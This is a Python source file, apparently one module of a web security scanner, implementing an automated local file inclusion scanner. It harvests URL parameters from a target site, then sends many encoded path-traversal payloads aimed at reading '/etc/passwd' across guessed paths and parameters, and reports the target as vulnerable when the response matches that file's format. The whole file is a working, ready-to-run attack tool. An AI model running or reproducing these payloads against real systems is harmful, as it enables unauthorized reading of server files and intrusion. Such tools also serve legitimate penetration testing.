import os
import re
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from r_ascan.config import HTTP_HEADERS, DEFAULT_TIMEOUT
from r_ascan.module.other import Other


class LFIScanner:
    def __init__(self, args):
        self.target = f"{args.target}:{args.port}" if args.port else args.target
        self.threads = args.threads
        self.verbose = args.verbose
        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
        self.printer = Other()

        self.payloads = self.load_payloads()
        self.common_params = ["file", "path", "page", "doc", "url", "template"]
        self.guess_paths = self.load_guess_paths()

    def load_payloads(self):
        return [
            "../../../../etc/passwd", "../../../etc/passwd", "../../../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd", "..%c0%af../etc/passwd",
            "..%c1%9c../etc/passwd", "..%e0%80%af../etc/passwd",
            "..\\..\\..\\etc\\passwd", "..%5c..%5c..%5cetc%5cpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd"
        ]

    def load_guess_paths(self):
        return [
            "", "view", "include", "page", "show", "load", "download", "preview",
            "view.php", "include.php", "page.php", "show.php", "load.php",
            "index.php", "main.php"
        ]

    def extract_params_from_dom(self):
        found = set()
        for proto in ["http", "https"]:
            url = f"{proto}://{self.target}"
            try:
                response = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
                soup = BeautifulSoup(response.text, "html.parser")
                for tag in soup.find_all(["a", "form", "script"]):
                    attr = tag.get("href") or tag.get("action") or tag.string or ""
                    found.update(re.findall(r"[?&]([a-zA-Z0-9_-]+)=", attr))
            except Exception as e:
                if self.verbose:
                    self.print_error("Failed extracting params from", url, e)
        return list(found.union(set(self.common_params)))

    def is_valid_passwd(self, text):
        if "root:x" in text and "nologin" in text:
            lines = text.splitlines()
            return sum(1 for line in lines if re.match(r"^[a-zA-Z0-9_-]+:x?:[0-9]+:[0-9]+:", line)) >= 3
        return False

    def check_payload(self, url):
        try:
            response = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
            if self.is_valid_passwd(response.text):
                return url
            elif self.verbose:
                self.print_status("Not Vuln", url, level="-")
        except Exception as e:
            if self.verbose:
                self.print_error("Error checking", url, e)
        return None

    def print_status(self, status_text, url, level="*"):
        colored_module = self.printer.color_text(self.module_name, "cyan")
        colored_url = self.printer.color_text(url, "yellow")
        color = "green" if status_text.lower() == "vuln" else "red"
        status_colored = self.printer.color_text(status_text, color)
        print(f"[{level}] [Module: {colored_module}] [{status_colored}] {colored_url}")

    def print_error(self, msg, url, error):
        colored_module = self.printer.color_text(self.module_name, "cyan")
        colored_url = self.printer.color_text(url, "yellow")
        colored_error = self.printer.color_text(str(error), "red")
        print(f"[!] [Module: {colored_module}] {msg} {colored_url} - {colored_error}")

    def run(self):
        colored_module = self.printer.color_text(self.module_name, "cyan")
        print(f"[*] [Module: {colored_module}] Starting LFI scan on {self.target}")
        params = self.extract_params_from_dom()
        tasks = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for proto in ["http", "https"]:
                for path in self.guess_paths:
                    base = f"{proto}://{self.target}"
                    if path:
                        base += f"/{path}"
                    for param in params:
                        for payload in self.payloads:
                            full_url = f"{base}?{param}={payload}"
                            tasks.append(executor.submit(self.check_payload, full_url))

            for future in as_completed(tasks):
                result = future.result()
                if result:
                    self.print_status("Vuln", result, level="+")
                    return [{"vulnerable": True, "payload": result}]

        self.print_status("Not Vuln", "No LFI detected", level="*")
        return [{"vulnerable": False}]


def scan(args=None):
    return LFIScanner(args).run()
